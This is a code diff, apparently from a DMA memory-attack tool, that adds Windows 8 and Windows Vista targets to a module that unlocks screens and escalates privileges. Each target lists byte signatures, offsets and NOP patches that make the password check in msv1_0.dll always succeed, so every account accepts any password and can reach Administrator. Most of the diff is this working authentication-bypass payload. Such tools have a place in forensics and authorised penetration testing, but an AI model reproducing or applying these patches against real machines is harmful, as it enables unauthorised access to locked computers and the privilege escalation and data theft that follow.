@@ -58,6 +58,70 @@ info = 'Unlocks the target\'s screensaver or lock screen. After running ' \
 
 targets = [
 Target(
+    name='Windows 8 MsvpPasswordValidate unlock/privilege escalation',
+    note='Ensures that the password-check always returns true. This will '
+    'cause all accounts to no longer require a password, and will also allow '
+    'you to escalate privileges to Administrator via the \'runas\' command.',
+    signatures=[
+        Signature(
+            os='Windows 8',
+            os_versions=['8.0'],
+            os_architectures=['x86'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0xde7],
+            chunks=[
+                Chunk(
+                    chunk=0x8bff558bec81ec90000000a1,
+                    chunkoffset=0x00,
+                    patch=0xb001,
+                    patchoffset=0xc1)
+                ]
+            ),
+        Signature(
+            os='Windows 8',
+            os_versions=['8.1'],
+            os_architectures=['x86'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0xca0],
+            chunks=[
+                Chunk(
+                    chunk=0x8bff558bec81ec90000000a1,
+                    chunkoffset=0x00,
+                    patch=0x909090909090,
+                    patchoffset=0xb3)
+                ]
+            ),
+        Signature(
+            os='Windows 8',
+            os_versions=['8.0', '8.1'],
+            os_architectures=['x64'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x208, 0xd78],
+            chunks=[
+                Chunk(
+                    chunk=0xc60f85,
+                    chunkoffset=0x00,
+                    patch=0x909090909090,
+                    patchoffset=0x01),
+                Chunk(
+                    chunk=0x66b80100,
+                    chunkoffset=0x07,
+                    patch=None,
+                    patchoffset=0x00)
+                ]
+            )
+        ]
+    ),
+Target(
     name='Windows 7 MsvpPasswordValidate unlock/privilege escalation',
     note='NOPs out the jump that is called if passwords doesn\'t match. This '
     'will cause all accounts to no longer require a password, and will also '
@@ -119,6 +183,56 @@ Target(
                     chunk=0x83f8100f8550940000b0018b,
                     chunkoffset=0x00,
                     patch=0x83f810909090909090b0018b,
+                    patchoffset=0x00)
+                ]
+            )
+        ]
+    ),
+Target(
+    name='Windows Vista MsvpPasswordValidate unlock/privilege escalation',
+    note='NOPs out the jump that is called if passwords doesn\'t match. This '
+    'will cause all accounts to no longer require a password, and will also '
+    'allow you to escalate privileges to Administrator via the \'runas\' '
+    'command. Note: As the patch stores the LANMAN/NTLM hash of the entered '
+    'password, the account will be locked out of any Windows AD domain '
+    'he/she was member of at this machine.',
+    signatures=[
+        Signature(
+            os='Windows Vista',
+            os_versions=['SP2'],
+            os_architectures=['x64'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x1a1],
+            chunks=[
+                Chunk(
+                    chunk=0xc60f85,
+                    chunkoffset=0x00,
+                    patch=0x909090909090,
+                    patchoffset=0x01),
+                Chunk(
+                    chunk=0xb8,
+                    chunkoffset=0x07,
+                    patch=None,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Windows Vista',
+            os_versions=['SP0', 'SP1', 'SP2'],
+            os_architectures=['x86'],
+            executable='msv1_0.dll',
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x432, 0x80f, 0x74a],
+            chunks=[
+                Chunk(
+                    chunk=0x83f8107513b0018b,
+                    chunkoffset=0x00,
+                    patch=0x83f8109090b0018b,
                     patchoffset=0x00)
                 ]
             )
@@ -219,7 +333,7 @@ def run(opts, memspace):
     if not opts.dry_run:
         success, backup = memspace.patch(address, chunks)
         if success:
-            if cfg.egg:
+            if cfg.egg: # TODO: Fix
                 sound.play('resources/inception.wav')
             term.info('Patch verified; successful')
             term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
@@ -227,7 +341,7 @@ def run(opts, memspace):
             term.warn('Write-back could not be verified; patching *may* ' +
                       'have been unsuccessful')
 
-        if opts.revert:
+        if opts.revert: # TODO: Check that this works
             term.poll('Press [enter] to revert the patch:')
             memspace.write(address, backup)
 
